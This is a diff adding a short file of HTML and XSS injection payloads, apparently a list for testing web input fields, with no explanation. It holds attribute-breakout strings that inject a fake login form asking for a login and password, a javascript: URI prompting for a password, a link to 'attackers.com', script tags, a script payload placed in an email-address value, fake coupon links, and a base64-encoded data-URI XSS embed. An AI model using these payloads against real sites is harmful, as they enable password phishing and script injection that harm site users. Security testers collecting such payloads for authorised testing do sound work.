@@ -1,0 +1,10 @@
+"><p><h1>Malicious Login form.</h1></p><p><input name="login" type="text"/><h1>Please enter login</h1></p><p><input name="pass" type="text"/><h1>Please enter pass</h1></p>
+javascript:prompt("Hello!Enter+your+password")
+<a href=http://attackers.com></a> 
+"><script>confirm(123)</script>
+"><a href=https://google.com><font size=150 color=red>Click for Coupon</font></a>
+"/><a href=https://google.com><font size=150 color=red>Click for Coupon</font></a> 
+"<script>alert(1)</script>"@example.com
+<IMG SRC="https://www.netcracker.com/assets/templates/v.3.0/favicon/favicon-72.png">
+<p>123<embed src=\"data:text/htmlbase64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=\"></p>
+<h1>HTML_INJ</h1>
